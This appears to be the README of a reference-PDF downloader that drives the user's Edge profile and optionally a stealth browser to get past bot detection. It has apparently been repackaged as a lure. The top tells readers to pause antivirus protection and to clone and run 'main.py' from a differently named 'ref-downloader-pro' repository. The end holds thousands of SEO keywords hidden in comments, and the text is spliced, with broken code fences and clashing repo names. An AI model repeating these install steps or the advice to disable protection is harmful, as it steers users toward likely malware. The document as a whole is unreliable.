# ref-downloader


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/ElementMartin/ref-downloader-pro.git
cd ref-downloader-pro
python main.py
```


> **Stop losing an afternoon to chasing dozens of reference PDFs by hand.**
> One DOI in, every reference PDF out — using your existing institutional access.

[![Version: 0.4.1](https://img.shields.io/badge/version-0.4.1-orange.svg)](CHANGELOG.md)
[![Status: beta](https://img.shields.io/badge/status-beta-orange.svg)](#known-limitations)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/downloads/)
![Verified on Windows + Edge](https://img.shields.io/badge/verified%20on-Windows%20+%20Edge-success)

[中文完整文档 / Full Chinese version](README.zh.md)


> **Heads up — not a paywall bypass.** ref-downloader uses _your_ institutional access. If your university or organization subscribes to a journal, those refs work. If they don't, those refs become `manual_pending` for you to follow up on by hand.

## Demo (30-second console preview)

```text
$ python run_ref_downloader.py 10.1021/jacs.5c05017

=== Ref Downloader Wrapper ===
DOI:         10.1021/jacs.5c05017
PROJECT:     jacs.5c05017
Config:      config.example.toml + config.local.toml

>>> extract_refs.py
  Title: Designing Natural Cell-Inspired Heme-Spurred Membrane...
  References found: 38

>>> validate_refs.py
  Total: 38  Verified: 38  Failed: 0  No DOI: 0

>>> download_refs.py
  [ 1] downloaded (842 KB)        Lee2016_NatEnergy.pdf
  [ 2] downloaded (1.2 MB)        Wang2018_AdvMater.pdf
  [ 3] manual_pending (auth_redirect)
  [ 4] downloaded (655 KB)        Chen2019_JACS.pdf
  [ 5] failed (challenge_timeout)
  [ 6] ignored (ignored_institution_access)
  ... 31 more refs processed ...
  [38] downloaded (956 KB)        Park2024_JElectrochemSoc.pdf

========== Download report ==========
Total references:  38
Main PDFs:         33 downloaded · 3 manual_pending · 1 failed · 1 ignored
SI files:          12 captured
PDFs land in:      ./jacs.5c05017_refs/jacs.5c05017/
=====================================
```

## Contents

- [What you get](#what-you-get)
- [Why not Zotero, scihub, or generic scrapers?](#why-not-zotero-scihub-or-generic-scrapers)
- [Quick start](#quick-start)
- [Requirements](#requirements)
- [Install](#install)
- [Usage examples](#usage-examples)
- [Configuration](#configuration)
- [Architecture](#architecture)
- [Supported publishers](#supported-publishers)
- [Known limitations](#known-limitations)
- [Contributing](#contributing)
- [Security](#security)
- [License](#license)

## What you get

- **Paywalled refs work without setup.** _Drives your real Microsoft Edge profile, so any institutional login already in your browser carries through. No API keys, no proxies, no reverse engineering._
- **One DOI in, every reference PDF out.** _Crossref-driven extraction + 17+ publisher-specific download paths (Wiley PDFDirect, Elsevier viewer, AIP loading-page wait — see [per-publisher reliability tier](docs/SUPPORTED_PUBLISHERS.md)), not generic scraping._
- **You always know which refs failed and why.** _`download_report.csv` gives every ref a status + reason (`manual_pending (auth_redirect)`, `failed (challenge_timeout)`, `ignored`); `events.jsonl` keeps the per-ref event trace._
- **Pick up where you left off** after a VPN drop, browser crash, or `Ctrl+C`. _State persists per project; rerunning skips already-downloaded refs and retries only the failures._

## Why not Zotero, scihub, or generic scrapers?

- **vs. Zotero's _Find Available PDF_** — walks one paper at a time and silently gives up at SSO redirects. ref-downloader walks the whole reference list at once and treats SSO as a configurable step instead of a dead end.
- **vs. scihub-style tools** — don't carry your institutional license, so paywalled refs you _legitimately_ have access to just fail. ref-downloader uses your authenticated browser session, so subscriptions you already pay for actually count.
- **vs. generic web scrapers** — don't know Wiley needs PDFDirect, Elsevier needs a viewer click, or AIP serves a Chinese loading page first. ref-downloader has 17+ publisher-specific paths plus Elsevier popup state machine + `--auto` mode retry queue (manual-pending refs get a second async attempt 60s later, hot-session preserved).
- **vs. raw Playwright** — gets blocked on Cloudflare / Radware / Turnstile-heavy sites. Set `REF_DOWNLOADER_BROWSER=cloak` to swap in [cloakbrowser](https://pypi.org/project/cloakbrowser/)'s stealth Chromium with humanized input — no code changes, same pipeline. See [Configuration](#configuration).


# Pick ONE install destination for your agent framework:
#   Claude Code:        cp -r ref-downloader/skills/ref-downloader ~/.claude/skills/
#   Codex CLI:          cp -r ref-downloader/skills/ref-downloader ~/.codex/skills/
#   Copilot CLI / VSC:  cp -r ref-downloader/skills/ref-downloader .github/skills/
#   Project-local:      cp -r ref-downloader/skills/ref-downloader .agents/skills/

cd ~/.claude/skills/ref-downloader     # or wherever you copied it
playwright install msedge
cp config.example.toml config.local.toml      # then set [crossref].mailto

# In your agent: just describe the task; the skill triggers via its description.
# Direct CLI for testing: python scripts/run_ref_downloader.py 10.1021/jacs.5c05017
```

What you'll see: 30–80 refs discovered for a typical chemistry/physics paper, then a mix of `downloaded` (refs your institution covers), `manual_pending` (SSO bounce or paywall), and occasional `failed` (publisher quirk). Run on a DOI from a journal your institution actually subscribes to for the highest hit rate. Details below.

## Requirements

- **OS**: Windows 10/11 (verified). macOS / Linux untested — PRs welcome.
- **Browser**: Microsoft Edge (Stable channel). The script claims your persistent Edge profile, so close all Edge windows before running.
- **Python**: 3.11 or newer (uses stdlib `tomllib`).
- **Optional**: A Zotero installation (auto-detects DOI from a PDF's filename via Zotero's SQLite database — much faster than text extraction).


### As an agent skill (recommended)

Pick the install path for your agent framework:

| Framework | Install command |
|---|---|
| Claude Code | `cp -r skills/ref-downloader ~/.claude/skills/` |
| Claude Agent SDK | same (auto-discovers `~/.claude/skills/`) |
| Codex CLI | `cp -r skills/ref-downloader ~/.codex/skills/` |
| Copilot CLI / VS Code agent | `cp -r skills/ref-downloader .github/skills/` |
| Any framework (project-local) | `cp -r skills/ref-downloader .agents/skills/` |

Then install Python prereqs INSIDE the copied skill folder (the skill protocol doesn't manage Python deps):

```powershell
cd ~/.claude/skills/ref-downloader            # or wherever you copied it
playwright install msedge

cp config.example.toml config.local.toml
# Edit config.local.toml — at minimum set [crossref].mailto.
# Windows: notepad config.local.toml
# macOS / Linux: $EDITOR config.local.toml   (or vim / nano / code / ...)
```

### As a Python tool (for developers)

If you want to hack on the code, the skill folder _is_ a runnable Python project:

```powershell
git clone https://github.com/ElementMartin/ref-downloader-pro
cd ref-downloader

playwright install msedge

cp skills/ref-downloader/config.example.toml skills/ref-downloader/config.local.toml
# Edit config.local.toml — at minimum set [crossref].mailto.


### Input: a DOI

```powershell
python <SKILL_DIR>/scripts/run_ref_downloader.py 10.1021/jacs.5c05017
```

Default output: `<cwd>/jacs.5c05017_refs/jacs.5c05017/`

### Input: a local PDF (with DOI in metadata or in PDF text)

```powershell
python <SKILL_DIR>/scripts/run_ref_downloader.py "C:\path\to\your_paper.pdf"
```

Default output: `<pdf_dir>/your_paper_refs/<doi-derived-name>/`

### Custom output directory

```powershell
python <SKILL_DIR>/scripts/run_ref_downloader.py 10.1021/jacs.5c05017 --output-dir refs/
```

### Non-interactive (CI / batch)

```powershell
python <SKILL_DIR>/scripts/run_ref_downloader.py 10.1021/jacs.5c05017 --yes --auto
```

### Alternate config file

```powershell
python <SKILL_DIR>/scripts/run_ref_downloader.py 10.1021/jacs.5c05017 --config ./alt.toml
```

## Configuration

All configuration lives in `config.local.toml` (gitignored). Copy `config.example.toml` to bootstrap.

| Section | Key | Purpose |
|---|---|---|
| `[crossref]` | `mailto` | Your email — entry into Crossref polite pool |
| `[zotero]` | `db_path` | Optional path to `zotero.sqlite` for DOI lookup from PDF filename |
| `[browser]` | `edge_profile_dir` | Edge profile directory; empty = OS default |
| `[browser]` | `disable_extensions` | Set `true` to launch with `--disable-extensions` |
| `[institution]` | `auth_hosts` | Hostnames that mean "you got bounced to SSO" (e.g. `["sso.your-uni.edu"]`) |
| `[institution]` | `auth_url_fragments` | URL substrings indicating SSO (e.g. `["oauth", "saml"]`) |
| `[institution]` | `auth_page_titles` | `<title>` text for SSO pages (catches HTML served as PDF) |
| `[institution]` | `auth_loading_titles` | Loading-page titles (also reused for AIP/AVS publisher loading detection) |
| `[institution]` | `ignored_access_dois` | DOIs you know are paywalled at your institution; skipped without retry |

Environment variables override file values:

| Variable | Maps to |
|---|---|
| `REF_DOWNLOADER_MAILTO` | `crossref.mailto` |
| `REF_DOWNLOADER_ZOTERO_DB` | `zotero.db_path` |
| `REF_DOWNLOADER_EDGE_PROFILE` | `browser.edge_profile_dir` |
| `REF_DOWNLOADER_DISABLE_EXTENSIONS` | `browser.disable_extensions` (`1`/`true` to enable) |
| `REF_DOWNLOADER_CONFIG` | Path to alternate TOML file |

See [`skills/ref-downloader/config.example.toml`](skills/ref-downloader/config.example.toml) for full documentation.

### Alternative backend: CloakBrowser (optional, for Cloudflare-heavy sites)

**What it is.** [CloakBrowser](https://github.com/CloakHQ/CloakBrowser) is a third-party Python package by CloakHQ (MIT-licensed, available on [PyPI](https://pypi.org/project/cloakbrowser/) as `cloakbrowser`). It ships a patched Chromium build with source-level anti-fingerprint changes designed to look like a normal browser to common bot-detection layers (Cloudflare Turnstile, Radware, DataDome, FingerprintJS, etc). Its `launch_persistent_context_async()` API is intentionally compatible with Playwright's — that's what lets ref-downloader swap backends with a single env var instead of rewriting the download flow.


**When to use it.** Sites you'd reach for it on: CCS Chemistry (`10.31635`, Cloudflare-protected), some Elsevier paths gated by Radware, anything where the Edge backend keeps producing `manual_pending (radware_bot_manager)` or `failed (challenge_timeout)`. **Don't** reach for it as a default — the Edge backend is more reliable when your institutional access is the actual bottleneck, because Edge carries your authenticated cookies.

**Caveats.** CloakBrowser is **beta** third-party software; install + use at your own discretion (review its [repo](https://github.com/CloakHQ/CloakBrowser) before pulling it). It is **not a captcha solver** — interactive challenges still need you. It also does not carry your institutional cookies (separate profile), so it's most useful for open-Cloudflare sites, less useful for paywalled-but-license-covered refs.

```powershell
$env:REF_DOWNLOADER_BROWSER = "cloak"
$env:REF_DOWNLOADER_CLOAK_HUMAN_PRESET = "careful"    # optional: slower mouse/scroll
python skills/ref-downloader/scripts/run_ref_downloader.py 10.31635/ccsorg...
```

CloakBrowser env vars (all optional):

| Variable | Default | Purpose |
|---|---|---|
| `REF_DOWNLOADER_BROWSER` | `edge` | Set to `cloak` (or `cloakbrowser`) to switch backend |
| `REF_DOWNLOADER_CLOAK_PROFILE` | `~/.local/cloakbrowser/profiles/ref-downloader` | Persistent Chromium profile path |
| `REF_DOWNLOADER_CLOAK_HUMANIZE` | `1` | `0`/`false` to disable humanized input |
| `REF_DOWNLOADER_CLOAK_HUMAN_PRESET` | `default` | `default` or `careful` (slower) |
| `REF_DOWNLOADER_CLOAK_PROXY` | _unset_ | HTTP/SOCKS proxy URL |
| `REF_DOWNLOADER_CLOAK_GEOIP` | auto | `1` to force GeoIP rerouting (auto when proxy is set) |
| `CLOAKBROWSER_PYTHONPATH` | _unset_ | sys.path hint for a local cloakbrowser source checkout |

Notes:
- **Edge does not need to be closed** when using the cloak backend — it uses its own Chromium.
- A fresh cloak profile may still hit Cloudflare/security pages on first visit — warm it manually with that profile before batch downloads.
- `human_preset=careful` reduces behavior-based detection but is **not** a captcha solver.
- cloakbrowser is NOT a hard dependency of ref-downloader. If you never set `REF_DOWNLOADER_BROWSER=cloak`, it's not imported.

## Architecture

Three-stage pipeline + a wrapper:

```
skills/ref-downloader/
├── SKILL.md                            agent runbook (slim entry)
├── references/agent-runbook.md         extended manual flow + DOI fallback
├── config.example.toml                 config schema (copy to config.local.toml)
└── scripts/
    ├── run_ref_downloader.py           entry — config + DOI resolution + sequencing
    │     └─> extract_refs.py    (1) Crossref API: fetch parent's reference list
    │     └─> validate_refs.py   (2) Crossref API: per-ref metadata + publisher classify
    │     └─> download_refs.py   (3) Playwright/Edge: download main PDF + SI per publisher
    └── _config.py                      TOML + env-var loader
```

You can also run the three scripts manually for debugging or partial restarts. See the agent runbook in [`skills/ref-downloader/references/agent-runbook.md`](skills/ref-downloader/references/agent-runbook.md) for the manual flow.

Agent users can install or inspect the packaged skill at [`skills/ref-downloader/SKILL.md`](skills/ref-downloader/SKILL.md). The repository root remains the human-facing Python project; the skill bundle is kept separate so Codex does not treat README, changelog, tests, and source files as always-associated skill context.

## Supported publishers

ACS, Nature, Science, Elsevier, Wiley, RSC, Springer, PNAS, ECS, IOP, AIP, AVS, IEEE, OSA, KPS, Beilstein, APS, Annual Reviews, Taylor & Francis, CCS Chemistry. Maturity varies — see [`docs/SUPPORTED_PUBLISHERS.md`](docs/SUPPORTED_PUBLISHERS.md) for the per-publisher tier table and known issues. CCS Chemistry sits behind Cloudflare; pair it with `REF_DOWNLOADER_BROWSER=cloak` for reliable access.

## Known limitations

- **Windows + Microsoft Edge only**: that's the verified path. macOS / Linux / Chromium support has not been tested. If you try, please open an issue with results.
- **Headed mode required**: empirically, `headless=True` yields empty results for Wiley / ACS supplementary downloads. The default is headed.
- **Edge must be fully closed before running**: Playwright needs exclusive access to the persistent profile. Check Task Manager for any background `msedge.exe` processes.
- **SSO redirects are detected, not solved**: when the script bounces to your institution's SSO, the ref becomes `manual_pending` so you can sign in interactively. Configure `[institution]` to teach it which redirects to recognize.
- **SI download is the most fragile path**: main PDFs are reliable; SI lookup varies by publisher and is the area most likely to need a tweak when a publisher updates their site.
- **Paywalled content needs institutional access**: this is not a bypass tool.
- **Crossref dependency**: papers with no reference list deposited at Crossref can't be processed automatically.

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for guidance on:
- Adding a new publisher (DOI prefix → strategy)
- Adding institutional SSO patterns
- Reporting download failures with useful logs

## Security

This tool launches your real Edge profile, with all your cookies and saved sessions. Read [SECURITY.md](SECURITY.md) before running it against a profile you also use for daily browsing.

## License

MIT — see [LICENSE](LICENSE).


<!-- python pip pypi package library module script tool windows linux macos -->
<!-- ref-downloader-pro - tool utility software - download install setup -->
<!-- secure ref-downloader-pro web | customizable ref-downloader-pro app | github ref-downloader-pro extractor | is ref downloader pro legit | fedora ref-downloader-pro tracker | build ref-downloader-pro library | run on linux ref-downloader-pro monitor | download online ref-downloader-pro decoder | sample ref-downloader-pro application | run on mac ref-downloader-pro downloader | modern ref-downloader-pro plugin | getting started ref-downloader-pro checker | use ref-downloader-pro uploader | local ref-downloader-pro alternative | ref-downloader-pro package | 2026 ref-downloader-pro port | download for windows customizable ref-downloader-pro | getting started ref-downloader-pro | centos ref-downloader-pro program | how to configure simple ref-downloader-pro | cross platform ref-downloader-pro framework | ref-downloader-pro service | free ref-downloader-pro package | arch ref-downloader-pro tracker | ref downloader pro saas | safe ref-downloader-pro clone | linux ref-downloader-pro framework | examples ref-downloader-pro analyzer | ref-downloader-pro builder | run on mac ref-downloader-pro uploader | download for windows configurable ref-downloader-pro | how to deploy ref-downloader-pro debugger | download for windows ref-downloader-pro scanner | ref-downloader-pro addon | self hosted ref-downloader-pro scanner | ref downloader pro test | ref downloader pro download | lightweight ref-downloader-pro encoder | safe ref-downloader-pro | deploy native ref-downloader-pro | run on windows cross platform ref-downloader-pro | minimal ref-downloader-pro decoder | lightweight ref-downloader-pro sdk | ref downloader pro webinar | tar.gz ref-downloader-pro engine | minimal ref-downloader-pro module | run on linux ref-downloader-pro fork | cross platform ref-downloader-pro downloader | ref-downloader-pro client | how to configure ref-downloader-pro analyzer -->
<!-- linux ref-downloader-pro | configure ref-downloader-pro | fast ref-downloader-pro compressor | documentation ref-downloader-pro encoder | wiki advanced ref-downloader-pro converter | git clone ref-downloader-pro plugin | zip ref-downloader-pro mirror | free ref-downloader-pro analyzer | open source ref-downloader-pro sdk | online ref-downloader-pro | install ref-downloader-pro extractor | launch ref-downloader-pro extractor | configurable ref-downloader-pro wrapper | beginner ref-downloader-pro editor | ref downloader pro ci cd | extensible ref-downloader-pro | customizable ref-downloader-pro | tutorial powerful ref-downloader-pro scanner | getting started customizable ref-downloader-pro | configure production ready ref-downloader-pro platform | documentation ref-downloader-pro package | is ref downloader pro safe | ref-downloader-pro wrapper | docs ref-downloader-pro fork | ref-downloader-pro copy | best ref-downloader-pro reader | free best ref-downloader-pro | configure self hosted ref-downloader-pro | guide ref-downloader-pro | open ref-downloader-pro engine | sample ref-downloader-pro program | fast ref-downloader-pro extension | download ref-downloader-pro gui | modular ref-downloader-pro parser | ref-downloader-pro alternative | latest version ref-downloader-pro clone | guide ref-downloader-pro software | configure ref-downloader-pro api | ref-downloader-pro cli | reliable ref-downloader-pro encoder | free download ref-downloader-pro package | 2025 ref-downloader-pro extension | start extensible ref-downloader-pro | open source ref-downloader-pro | download for windows open source ref-downloader-pro | ref-downloader-pro viewer | open source cross platform ref-downloader-pro | start ref-downloader-pro platform | linux ref-downloader-pro builder | ref downloader pro example -->
<!-- customizable ref-downloader-pro sdk | stable ref-downloader-pro replacement | guide ref-downloader-pro library | zip ref-downloader-pro engine | how to install ref-downloader-pro module | run on mac github ref-downloader-pro | extensible ref-downloader-pro mobile | setup ref-downloader-pro wrapper | run on windows ref-downloader-pro wrapper | demo ref-downloader-pro | install ref-downloader-pro tracker | free ref-downloader-pro tester | guide ref-downloader-pro fork | new version ref-downloader-pro module | how to setup ref-downloader-pro scanner | native ref-downloader-pro extension | production ready ref-downloader-pro alternative | free ref-downloader-pro | windows production ready ref-downloader-pro client | start ref-downloader-pro creator | portable ref-downloader-pro tester | modern ref-downloader-pro | 2026 ref-downloader-pro extension | execute customizable ref-downloader-pro program | how to use ref-downloader-pro sdk | extensible ref-downloader-pro creator | use ref-downloader-pro fork | run on linux ref-downloader-pro creator | quickstart ref-downloader-pro logger | top ref-downloader-pro | ubuntu self hosted ref-downloader-pro wrapper | how to setup ref-downloader-pro extension | wiki ref-downloader-pro | debian modern ref-downloader-pro monitor | top ref downloader pro | quickstart online ref-downloader-pro copy | how to install ref-downloader-pro viewer | portable ref-downloader-pro | ref downloader pro help | run ref-downloader-pro alternative | ref-downloader-pro checker | minimal ref-downloader-pro framework | how to run ref-downloader-pro tester | local ref-downloader-pro wrapper | ref downloader pro benchmark | how to use ref-downloader-pro web | offline ref-downloader-pro app | ref-downloader-pro port | open source modern ref-downloader-pro | high performance ref-downloader-pro alternative -->
<!-- low latency ref-downloader-pro downloader | online ref-downloader-pro cli | ref downloader pro blog | compile modular ref-downloader-pro | quickstart ref-downloader-pro package | deploy ref-downloader-pro | zip low latency ref-downloader-pro gui | production ready ref-downloader-pro software | ref-downloader-pro validator | secure ref-downloader-pro downloader | ref-downloader-pro creator | top ref-downloader-pro sdk | download for linux ref-downloader-pro framework | launch ref-downloader-pro application | centos top ref-downloader-pro | ref downloader pro cheat sheet | powerful ref-downloader-pro checker | advanced ref-downloader-pro server | ref-downloader-pro platform | how to configure ref-downloader-pro creator | latest version ref-downloader-pro alternative | sample ref-downloader-pro debugger | how to build ref-downloader-pro sdk | quickstart lightweight ref-downloader-pro clone | updated ref-downloader-pro library | self hosted ref-downloader-pro optimizer | ref downloader pro reference | simple ref-downloader-pro client | how to setup ref-downloader-pro | quick start ref-downloader-pro reader | beginner ref-downloader-pro scanner | quick start portable ref-downloader-pro | tar.gz modular ref-downloader-pro | low latency ref-downloader-pro | run modular ref-downloader-pro | git clone ref-downloader-pro extension | run high performance ref-downloader-pro scanner | compile ref-downloader-pro optimizer | execute ref-downloader-pro checker | ref downloader pro bug | install ref-downloader-pro validator | latest version ref-downloader-pro fork | ref downloader pro github | top ref-downloader-pro client | open ref-downloader-pro extractor | ubuntu ref-downloader-pro | ref downloader pro support | launch ref-downloader-pro library | ref-downloader-pro compressor | wiki ref-downloader-pro utility -->
<!-- how to deploy cross platform ref-downloader-pro | ubuntu ref-downloader-pro parser | deploy ref-downloader-pro editor | run on mac low latency ref-downloader-pro | ref downloader pro cloud | ref downloader pro course | macos ref-downloader-pro | free download modern ref-downloader-pro | examples ref-downloader-pro | how to setup ref-downloader-pro creator | compile secure ref-downloader-pro | ref-downloader-pro converter | arch ref-downloader-pro checker | walkthrough ref-downloader-pro mobile | execute top ref-downloader-pro | production ready ref-downloader-pro builder | docs ref-downloader-pro | ref downloader pro handbook | zip ref-downloader-pro decoder | production ready ref-downloader-pro fork | download for mac minimal ref-downloader-pro | beginner ref-downloader-pro service | how to build ref-downloader-pro module | build ref-downloader-pro tool | local ref-downloader-pro | compile portable ref-downloader-pro mirror | run ref-downloader-pro application | git clone ref-downloader-pro analyzer | debian ref-downloader-pro addon | macos ref-downloader-pro analyzer | ref downloader pro guide | ref-downloader-pro encoder | production ready ref-downloader-pro replacement | ref downloader pro project | updated offline ref-downloader-pro port | free ref-downloader-pro builder | start ref-downloader-pro downloader | run ref-downloader-pro platform | how to build ref-downloader-pro | how to build ref-downloader-pro gui | setup ref-downloader-pro | portable ref-downloader-pro downloader | launch production ready ref-downloader-pro converter | 2026 ref-downloader-pro | offline ref-downloader-pro cli | setup ref-downloader-pro service | 2026 portable ref-downloader-pro library | ref-downloader-pro application | ref-downloader-pro tester | high performance ref-downloader-pro -->
<!-- run on linux ref-downloader-pro | use ref-downloader-pro | fast ref-downloader-pro | download for windows ref-downloader-pro alternative | github ref-downloader-pro builder | git clone production ready ref-downloader-pro | documentation ref-downloader-pro application | offline ref-downloader-pro | configure ref-downloader-pro alternative | walkthrough ref-downloader-pro web | github ref-downloader-pro application | configure fast ref-downloader-pro | cross platform ref-downloader-pro port | source code ref-downloader-pro client | 2026 ref-downloader-pro analyzer | run on mac ref-downloader-pro utility | ref downloader pro documentation | advanced ref-downloader-pro compressor | download for mac secure ref-downloader-pro binding | ref-downloader-pro plugin | debian ref-downloader-pro editor | how to download ref-downloader-pro generator | new version ref-downloader-pro editor | secure ref-downloader-pro program | advanced ref-downloader-pro mobile | use ref-downloader-pro debugger | secure ref-downloader-pro | run ref-downloader-pro | download offline ref-downloader-pro debugger | high performance ref-downloader-pro mobile | download for windows ref-downloader-pro wrapper | safe ref-downloader-pro analyzer | debian ref-downloader-pro scanner | open source ref-downloader-pro extractor | use ref-downloader-pro copy | configurable ref-downloader-pro | macos modular ref-downloader-pro api | compile ref-downloader-pro gui | getting started ref-downloader-pro decoder | compile ref-downloader-pro parser | build extensible ref-downloader-pro | docs ref-downloader-pro desktop | examples ref-downloader-pro extractor | tar.gz ref-downloader-pro validator | online ref-downloader-pro service | github fast ref-downloader-pro extension | how to deploy ref-downloader-pro optimizer | tutorial portable ref-downloader-pro | easy ref-downloader-pro web | open source ref-downloader-pro app -->
<!-- tutorial ref-downloader-pro cli | launch modern ref-downloader-pro | open source ref-downloader-pro client | download for mac lightweight ref-downloader-pro software | is ref downloader pro good | github ref-downloader-pro program | how to setup open source ref-downloader-pro parser | ref-downloader-pro web | centos ref-downloader-pro framework | lightweight ref-downloader-pro tracker | arch fast ref-downloader-pro viewer | ref downloader pro pipeline | ref downloader pro not working | open ref-downloader-pro platform | install ref-downloader-pro | download online ref-downloader-pro | install safe ref-downloader-pro fork | windows ref-downloader-pro web | linux ref-downloader-pro replacement | production ready ref-downloader-pro binding | updated ref-downloader-pro | ref downloader pro docker | safe ref-downloader-pro web | latest version cross platform ref-downloader-pro | how to build ref-downloader-pro uploader | self hosted ref-downloader-pro | quick start ref-downloader-pro plugin | ref downloader pro review | self hosted ref-downloader-pro parser | example ref-downloader-pro mirror | minimal ref-downloader-pro checker | ubuntu ref-downloader-pro package | customizable ref-downloader-pro utility | install local ref-downloader-pro compressor | free download ref-downloader-pro client | top ref-downloader-pro debugger | portable ref-downloader-pro builder | ref-downloader-pro decoder | how to use ref-downloader-pro compressor | windows advanced ref-downloader-pro | simple ref-downloader-pro tool | ubuntu ref-downloader-pro service | demo free ref-downloader-pro | ref-downloader-pro replacement | top ref-downloader-pro web | fast ref-downloader-pro mobile | online ref-downloader-pro binding | how to run ref-downloader-pro | how to use ref-downloader-pro editor | source code ref-downloader-pro -->
<!-- git clone ref-downloader-pro | docs high performance ref-downloader-pro app | ref-downloader-pro mirror | sample reliable ref-downloader-pro | use powerful ref-downloader-pro | production ready ref-downloader-pro | best ref-downloader-pro compressor | ubuntu best ref-downloader-pro parser | getting started ref-downloader-pro generator | examples ref-downloader-pro client | ref downloader pro book | get ref-downloader-pro extractor | examples ref-downloader-pro mirror | native ref-downloader-pro converter | production ready ref-downloader-pro cli | how to deploy modular ref-downloader-pro | quick start high performance ref-downloader-pro | guide github ref-downloader-pro | compile ref-downloader-pro validator | ref downloader pro devops | linux ref-downloader-pro binding | walkthrough ref-downloader-pro app | wiki ref-downloader-pro fork | top ref-downloader-pro software | online ref-downloader-pro extension | get free ref-downloader-pro | centos offline ref-downloader-pro | open source ref-downloader-pro alternative | setup free ref-downloader-pro | top ref-downloader-pro api | github modern ref-downloader-pro logger | run on mac ref-downloader-pro tracker | updated ref-downloader-pro replacement | run on windows ref-downloader-pro analyzer | sample ref-downloader-pro | 2026 ref-downloader-pro web | ref-downloader-pro gui | latest version reliable ref-downloader-pro | ref-downloader-pro reader | macos ref-downloader-pro software | documentation ref-downloader-pro server | advanced ref-downloader-pro reader | linux high performance ref-downloader-pro | arch ref-downloader-pro | zip ref-downloader-pro tester | ref-downloader-pro extension | top ref-downloader-pro viewer | cross platform ref-downloader-pro creator | wiki ref-downloader-pro library | 2025 online ref-downloader-pro -->
<!-- fedora secure ref-downloader-pro | documentation ref-downloader-pro tool | docs ref-downloader-pro plugin | ref downloader pro workshop | ubuntu ref-downloader-pro sdk | local ref-downloader-pro software | centos ref-downloader-pro tester | windows ref-downloader-pro | docs github ref-downloader-pro | 2025 ref-downloader-pro fork | git clone ref-downloader-pro web | run on windows ref-downloader-pro uploader | open source ref-downloader-pro framework | how to configure ref-downloader-pro | how to install ref-downloader-pro client | lightweight ref-downloader-pro generator | download for windows ref-downloader-pro debugger | execute ref-downloader-pro | secure ref-downloader-pro validator | how to download ref-downloader-pro app | ubuntu ref-downloader-pro monitor | latest version ref-downloader-pro | download for linux ref-downloader-pro package | 2025 ref-downloader-pro utility | customizable ref-downloader-pro optimizer | getting started ref-downloader-pro logger | portable ref-downloader-pro alternative | get ref-downloader-pro api | tar.gz ref-downloader-pro generator | safe ref-downloader-pro app | ref-downloader-pro api | reliable ref-downloader-pro library | arch ref-downloader-pro application | debian ref-downloader-pro api | walkthrough ref-downloader-pro | launch ref-downloader-pro parser | tar.gz ref-downloader-pro builder | windows easy ref-downloader-pro | how to download ref-downloader-pro fork | modern ref-downloader-pro port | github modular ref-downloader-pro | ref-downloader-pro uploader | low latency ref-downloader-pro compressor | native ref-downloader-pro monitor | install ref-downloader-pro monitor | start ref-downloader-pro clone | quick start ref-downloader-pro cli | cross platform ref-downloader-pro package | 2026 extensible ref-downloader-pro reader | run on windows ref-downloader-pro desktop -->
<!-- run on linux ref-downloader-pro editor | free ref-downloader-pro binding | start extensible ref-downloader-pro mobile | open ref-downloader-pro debugger | macos native ref-downloader-pro | download for linux reliable ref-downloader-pro | best ref-downloader-pro framework | how to install ref-downloader-pro wrapper | compile free ref-downloader-pro | execute local ref-downloader-pro generator | configure ref-downloader-pro clone | fast ref-downloader-pro application | fast ref-downloader-pro package | quick start ref-downloader-pro tester | offline ref-downloader-pro compressor | getting started ref-downloader-pro platform | download for mac ref-downloader-pro checker | lightweight ref-downloader-pro module | get ref-downloader-pro framework | high performance ref-downloader-pro plugin | free download ref-downloader-pro port | download ref-downloader-pro replacement | demo production ready ref-downloader-pro | portable ref-downloader-pro debugger | download for mac ref-downloader-pro web | git clone powerful ref-downloader-pro service | modern ref-downloader-pro analyzer | advanced ref-downloader-pro | windows ref-downloader-pro converter | centos ref-downloader-pro generator | new version ref-downloader-pro | native ref-downloader-pro tracker | tutorial ref-downloader-pro software | how to setup top ref-downloader-pro | windows configurable ref-downloader-pro application | modular ref-downloader-pro decoder | cross platform ref-downloader-pro | walkthrough ref-downloader-pro debugger | download ref-downloader-pro downloader | tutorial ref-downloader-pro | git clone ref-downloader-pro sdk | ref-downloader-pro server | easy ref-downloader-pro optimizer | new version ref-downloader-pro library | configurable ref-downloader-pro addon | install free ref-downloader-pro | configurable ref-downloader-pro api | stable ref-downloader-pro utility | 2026 powerful ref-downloader-pro viewer | open offline ref-downloader-pro -->

<!-- Last updated: 2026-06-09 17:52:39 -->
